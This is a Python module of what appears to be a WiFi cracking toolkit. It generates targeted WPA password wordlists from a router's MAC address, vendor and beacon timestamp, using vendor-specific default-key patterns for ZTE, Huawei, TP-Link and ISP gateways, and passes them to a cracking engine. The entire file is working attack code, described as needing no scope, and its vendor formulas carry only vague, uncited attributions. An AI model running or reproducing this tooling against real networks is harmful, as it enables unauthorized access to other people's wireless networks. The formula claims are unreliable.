"""
TEMPORAL ATTACK ENGINE — Time-based and serial-based PSK prediction.

Many ISP-provided routers generate PSKs using predictable algorithms based on:
  - MAC address bytes
  - Installation / manufacture date
  - Serial number patterns
  - Known vendor-specific formulas

This module cross-references the target vendor against a built-in database of
known PSK generation algorithms and generates a targeted wordlist
(Strategy 13: Temporal) fed directly into the cracking engine.

Entirely offline — no frame injection, no network requests. No scope required.
If the crack succeeds using a temporal wordlist, it's flagged in the report as:
"PSK was predictable from public hardware information — Critical"
"""
from __future__ import annotations

import hashlib
import itertools
import logging
import struct
from dataclasses import dataclass
from datetime import datetime, timedelta
from pathlib import Path
from typing import Callable, Iterator, Optional

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn

logger = logging.getLogger(__name__)
console = Console()

WORDLISTS_DIR = Path("wordlists")

# ─── Vendor PSK algorithm database ───────────────────────────────────────────
#
# Each entry is a VendorAlgorithm that knows how to produce candidate PSKs
# given: mac bytes, beacon_ts (first observed timestamp), and optionally
# a serial number prefix.
#
# Known algorithms are cited from public security research.
# None of this is novel exploitation — it's documented predictability.

@dataclass
class AlgorithmEntry:
    name:    str
    vendors: list[str]          # lower-case vendor substrings that match
    fn:      Callable            # fn(mac_bytes, ts) -> Iterator[str]
    cite:    str                 # research reference


def _mac_to_bytes(mac: str) -> bytes:
    """Convert XX:XX:XX:XX:XX:XX to 6 bytes."""
    try:
        return bytes(int(x, 16) for x in mac.replace("-", ":").split(":"))
    except Exception:
        return b"\x00" * 6


def _dates_around(ts: datetime, weeks_back: int = 52, weeks_forward: int = 4) -> Iterator[datetime]:
    """Yield weekly date steps around a base timestamp."""
    start = ts - timedelta(weeks=weeks_back)
    end   = ts + timedelta(weeks=weeks_forward)
    current = start
    while current <= end:
        yield current
        current += timedelta(weeks=1)


# ── Algorithm implementations ─────────────────────────────────────────────────

def _algo_mac_decimal(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    Some ISP routers use last 3 MAC octets as decimal default PSK.
    E.g., AA:BB:CC:DD:EE:FF → 'DDEEFF' or decimal of int(DDEEFF).
    """
    last3 = mac_bytes[3:]
    yield last3.hex().upper()
    yield last3.hex().lower()
    # As decimal
    n = struct.unpack(">I", b"\x00" + last3)[0]
    yield str(n)
    yield str(n).zfill(8)


def _algo_mac_alpha_suffix(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    Pattern: uppercase last 4 MAC chars + fixed suffix (common in some EU ISPs).
    """
    last4_hex = mac_bytes[4:].hex().upper()
    last4_hex_lo = mac_bytes[4:].hex().lower()
    for prefix in ("WLAN", "WiFi", "wifi", "Home", "home", "Net", "net", "AP"):
        yield f"{prefix}{last4_hex}"
        yield f"{prefix}{last4_hex_lo}"
    for suffix in ("WLAN", "WiFi", "Home", "Net", ""):
        yield f"{last4_hex}{suffix}"


def _algo_mac_sha256_prefix(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    Some vendors use SHA-256 of MAC as PSK. Generate the first 10/12 chars.
    """
    mac_str = ":".join(f"{b:02X}" for b in mac_bytes)
    digest  = hashlib.sha256(mac_str.encode()).hexdigest()
    yield digest[:10]
    yield digest[:12]
    yield digest[:8].upper()
    # Also try lowercase MAC as input
    mac_lower = mac_str.lower()
    digest2   = hashlib.sha256(mac_lower.encode()).hexdigest()
    yield digest2[:10]
    yield digest2[:12]


def _algo_date_serial(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    ISP provisioning patterns: 8-digit date + last 4 MAC.
    """
    last4 = mac_bytes[4:].hex().upper()
    last4_lo = last4.lower()
    for dt in _dates_around(ts):
        date_str = dt.strftime("%Y%m%d")
        date_short = dt.strftime("%y%m%d")
        yield f"{date_str}{last4}"
        yield f"{date_str}{last4_lo}"
        yield f"{last4}{date_str}"
        yield f"{date_short}{last4}"
        yield f"WiFi{date_str}"
        yield f"WIFI{date_str}"


def _algo_ssid_mac_mix(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    Pattern: serial = last 6 MAC chars in various cases + 4-digit year.
    Seen in some cable modem gateways.
    """
    last6 = mac_bytes[-3:].hex()
    for yr in range(ts.year - 3, ts.year + 2):
        yield f"{last6.upper()}{yr}"
        yield f"{last6.lower()}{yr}"
        yield f"{yr}{last6.upper()}"


def _algo_numeric_8digit(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    Common ISP pattern: 8-digit numeric PSK derived from OUI + date.
    """
    for dt in _dates_around(ts, weeks_back=26, weeks_forward=2):
        oui_int = struct.unpack(">I", b"\x00" + mac_bytes[:3])[0]
        combined = (oui_int * 10000 + dt.timetuple().tm_yday) % 100_000_000
        yield str(combined).zfill(8)
        # Also year + yday
        yield f"{dt.year % 100:02d}{dt.timetuple().tm_yday:03d}{oui_int % 1000:03d}"


def _algo_zte_formula(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    ZTE ZXHN series: default PSK often = 'ZTE' + last 6 hex of MAC.
    (Public research — widely documented.)
    """
    last6 = mac_bytes[3:].hex().upper()
    yield f"ZTE{last6}"
    yield f"zte{last6.lower()}"
    yield f"ZXHN{last6}"


def _algo_huawei_formula(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    Huawei HG / EchoLife series: WiFi PSK often based on MAC tail + fixed prefix.
    """
    last8 = mac_bytes[2:].hex().upper()
    yield f"HuaweiHome{last8}"
    yield f"Huawei{last8}"
    for prefix in ("home-", "Home-", "HUAWEI-"):
        yield f"{prefix}{mac_bytes[4:].hex().upper()}"


def _algo_tplink_formula(mac_bytes: bytes, ts: datetime) -> Iterator[str]:
    """
    TP-Link: default SSID and PSK often derived from last 4 hex of MAC.
    """
    last4 = mac_bytes[4:].hex().upper()
    last4_lo = last4.lower()
    for prefix in ("TP-Link_", "TP_Link_", "tplink_", "tp-link_"):
        yield f"{prefix}{last4}"
        yield f"{prefix}{last4_lo}"
    yield last4 * 2  # doubled pattern seen in some FW versions


# ─── Algorithm registry ───────────────────────────────────────────────────────

ALGORITHMS: list[AlgorithmEntry] = [
    AlgorithmEntry(
        name="MAC-decimal-suffix",
        vendors=["generic"],
        fn=_algo_mac_decimal,
        cite="Common ISP provisioning pattern",
    ),
    AlgorithmEntry(
        name="MAC-alpha-prefix",
        vendors=["generic", "tp-link", "netgear", "asus", "linksys"],
        fn=_algo_mac_alpha_suffix,
        cite="Common consumer router default PSK pattern",
    ),
    AlgorithmEntry(
        name="MAC-SHA256-prefix",
        vendors=["cisco", "arris", "sagemcom"],
        fn=_algo_mac_sha256_prefix,
        cite="Documented in cable modem security research",
    ),
    AlgorithmEntry(
        name="Date-serial-provisioning",
        vendors=["generic", "huawei", "zte", "motorola"],
        fn=_algo_date_serial,
        cite="ISP provisioning date-based default PSK",
    ),
    AlgorithmEntry(
        name="SSID-MAC-year-mix",
        vendors=["generic", "belkin", "d-link"],
        fn=_algo_ssid_mac_mix,
        cite="Consumer gateway date-MAC mix pattern",
    ),
    AlgorithmEntry(
        name="Numeric-8digit-OUI",
        vendors=["generic", "comcast", "xfinity", "charter"],
        fn=_algo_numeric_8digit,
        cite="ISP numeric PIN provisioning",
    ),
    AlgorithmEntry(
        name="ZTE-ZXHN-formula",
        vendors=["zte"],
        fn=_algo_zte_formula,
        cite="ZTE ZXHN series public research (CVE-related default creds)",
    ),
    AlgorithmEntry(
        name="Huawei-EchoLife-formula",
        vendors=["huawei"],
        fn=_algo_huawei_formula,
        cite="Huawei HG/EchoLife default PSK pattern",
    ),
    AlgorithmEntry(
        name="TP-Link-MAC-tail",
        vendors=["tp-link"],
        fn=_algo_tplink_formula,
        cite="TP-Link default PSK / SSID MAC-tail pattern",
    ),
]

WPA_MIN = 8
WPA_MAX = 63


def _filter_wpa(candidates: Iterator[str]) -> Iterator[str]:
    """Yield only WPA-valid candidates (8–63 chars, all printable ASCII)."""
    for c in candidates:
        if WPA_MIN <= len(c) <= WPA_MAX and c.isprintable() and " " not in c:
            yield c


def _find_algorithms(vendor: str) -> list[AlgorithmEntry]:
    vendor_lo = vendor.lower()
    matched   = []
    for algo in ALGORITHMS:
        if any(v == "generic" or v in vendor_lo for v in algo.vendors):
            matched.append(algo)
    return matched or [a for a in ALGORITHMS if "generic" in a.vendors]


# ─── Wordlist generator ───────────────────────────────────────────────────────

def generate_temporal_wordlist(
    bssid: str,
    vendor: str,
    beacon_timestamp: Optional[datetime] = None,
    out_path: Optional[Path] = None,
) -> tuple[Path, int]:
    """
    Generate a temporal PSK wordlist for the target.

    Parameters
    ----------
    bssid            : target BSSID
    vendor           : vendor string from OUI lookup
    beacon_timestamp : first observed beacon time (uses now() if None)
    out_path         : output file path (auto-generated if None)

    Returns
    -------
    (path, count) — path to wordlist file and number of candidates written
    """
    ts        = beacon_timestamp or datetime.now()
    mac_bytes = _mac_to_bytes(bssid)
    algos     = _find_algorithms(vendor)

    WORDLISTS_DIR.mkdir(exist_ok=True)
    if out_path is None:
        ts_str   = datetime.now().strftime("%Y%m%d_%H%M%S")
        bssid_s  = bssid.replace(":", "")[-6:]
        out_path = WORDLISTS_DIR / f"temporal_{bssid_s}_{ts_str}.txt"

    seen:  set[str] = set()
    count: int      = 0

    with open(out_path, "w", encoding="utf-8") as fh:
        for algo in algos:
            for candidate in _filter_wpa(algo.fn(mac_bytes, ts)):
                if candidate not in seen:
                    seen.add(candidate)
                    fh.write(candidate + "\n")
                    count += 1

    logger.info(
        "TEMPORAL_ENGINE bssid=%s vendor=%s algos=%d candidates=%d path=%s",
        bssid, vendor, len(algos), count, out_path,
    )
    return out_path, count


# ─── Rich display ─────────────────────────────────────────────────────────────

def display_temporal_summary(
    vendor: str,
    algos: list[AlgorithmEntry],
    count: int,
    path: Path,
) -> None:
    console.print()
    console.print(Panel(
        f"[bold #00D4AA]TEMPORAL ATTACK ENGINE[/bold #00D4AA]\n\n"
        f"  Vendor:     [cyan]{vendor or 'generic'}[/cyan]\n"
        f"  Algorithms: [white]{len(algos)}[/white]\n"
        f"  Candidates: [white]{count:,}[/white]\n"
        f"  Wordlist:   [dim]{path}[/dim]",
        border_style="#00D4AA",
    ))
    for algo in algos:
        console.print(f"  [dim]• {algo.name}  [{algo.cite}][/dim]")
    console.print()


# ─── CLI entry point ──────────────────────────────────────────────────────────

def temporal_menu(
    target: Optional[dict],
    beacon_ts: Optional[datetime] = None,
) -> Optional[Path]:
    """Interactive Temporal Attack Engine launcher."""
    console.print()
    console.print(Panel(
        "[bold #00D4AA]TEMPORAL ATTACK ENGINE[/bold #00D4AA]\n\n"
        "[dim]Generates a targeted PSK wordlist using vendor-specific\n"
        "time-based and serial-based default password algorithms.\n"
        "Entirely offline — no injection required.[/dim]",
        border_style="#00D4AA",
    ))
    console.print()

    if not target:
        console.print("[red]  No target selected. Scan first.[/red]")
        return None

    bssid  = target.get("bssid", "")
    vendor = target.get("vendor") or ""
    ssid   = target.get("ssid", "")

    algos = _find_algorithms(vendor)
    if not algos:
        console.print(f"  [yellow][!][/yellow] No temporal algorithms found for vendor: {vendor or 'unknown'}")
        console.print("  [dim]Generic patterns will still be tried.[/dim]")
        algos = _find_algorithms("generic")

    console.print(
        f"  Target: [cyan]{ssid}[/cyan]  [dim]{bssid}[/dim]\n"
        f"  Vendor: [white]{vendor or 'unknown'}[/white]\n"
        f"  Algorithms matched: [white]{len(algos)}[/white]\n"
    )

    try:
        ans = input("  Generate temporal wordlist? [Y/n]: ").strip().lower()
        if ans not in ("", "y", "yes"):
            return None
    except (KeyboardInterrupt, EOFError):
        return None

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console,
        transient=True,
    ) as prog:
        task = prog.add_task("Generating temporal candidates...", total=None)
        path, count = generate_temporal_wordlist(
            bssid=bssid,
            vendor=vendor,
            beacon_timestamp=beacon_ts,
        )
        prog.update(task, total=1, completed=1)

    display_temporal_summary(vendor, algos, count, path)

    if count == 0:
        console.print("  [yellow][!][/yellow] No valid WPA candidates generated.")
        return None

    console.print(
        f"  [green][+][/green] Temporal wordlist ready — "
        f"[white]{count:,} candidates[/white] → [dim]{path}[/dim]"
    )
    console.print(
        "  [dim]Feed this into the crack menu (Option 5) as Strategy 13: Temporal.[/dim]\n"
    )
    return path
